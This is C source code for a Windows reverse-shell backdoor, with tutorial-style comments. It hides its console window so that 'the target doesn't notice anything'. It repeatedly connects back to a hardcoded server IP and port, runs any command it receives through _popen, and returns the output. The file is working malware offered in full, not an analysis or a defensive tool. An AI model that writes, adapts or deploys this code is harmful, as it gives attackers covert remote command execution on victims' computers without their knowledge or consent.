#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size)) /* Define BZERO FUNCTION, to clear input mem. addr. with 0s*/



int sock; /* create socket variable */

/*	SHELL FUNCTION		*/
void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];


	while (1) {
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0); // Receive, recv(socket, storage for response, size of response)

		if (strncmp("q", buffer, 1) == 0) // If buffer[0] == q // User wants to quit
		{
			closesocket(sock); // close socket [winsock2.h]
			WSACleanup(); // terminates the use of Winsock2 DLL [winsock2.h]
			exit(0); // exit program
		}
		else if(strncmp("cd ", buffer, 3) == 0)
		{
			chdir((char*)(buffer+3));
		}
		else {
			FILE *fp; // Create file descriptor
			fp = _popen(buffer, "r"); // read buffer and execute it, store it into fp
			while(fgets(container,1024,fp) != NULL) // Read 1024 bytes from fp, repeat until less than 1024 bytes
			{
				strcat(total_response, container); // append 1024 bytes from container to total_response
			}
			send(sock, total_response, sizeof(total_response), 0); // send total_response
			fclose(fp); // close file descriptor
		}

	}

}
/*-----------------------------------------------*/

/*	WINDOWS API MAIN FUNCTION	*/
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	// Hide the window so the target doesn't notice anything //

	HWND stealth; // Create new HANDLE TO WINDOW called STEALTH [winuser.h]
	AllocConsole(); // Allocate NEW CONSOLE to this proccess
	stealth = FindWindowA("ConsoleWindowClass", NULL); // Set STEALTH to WINDOW with 2 parameters: class, name [winuser.h]

	ShowWindow(stealth, 0); // SHOW WINDOW with properties: handle(stealth), nCmdShow(0 = hidden) [winuser.h]

	//-------------------------------------------------------//

	struct sockaddr_in ServAddr; // Create new sockaddr_in struct named ServAddr, it will contain SERVER-IP
	unsigned short ServPort; // Create new unsigned short for the SERVER-PORT, U-SHORT {0 - 65,535}
	char *ServIP; // Create a pointer that points to mem. address of ServIP;
	WSADATA wsaData; // WSADATA - structure that contains information about windows sockets [winsock2.h]

	ServIP = "192.168.189.140";
	ServPort = 42505;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	/*
			struct sockaddr_in {
			    short            sin_family;   // e.g. AF_INET, AF_INET6
			    unsigned short   sin_port;     // e.g. htons(3490)
			    struct in_addr   sin_addr;     // see struct in_addr, below
			    char             sin_zero[8];  // zero this if you want to
			};

			struct in_addr {
			    unsigned long s_addr;          // load with inet_pton()
			};
	*/


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}

/*-----------------------------------------------*/
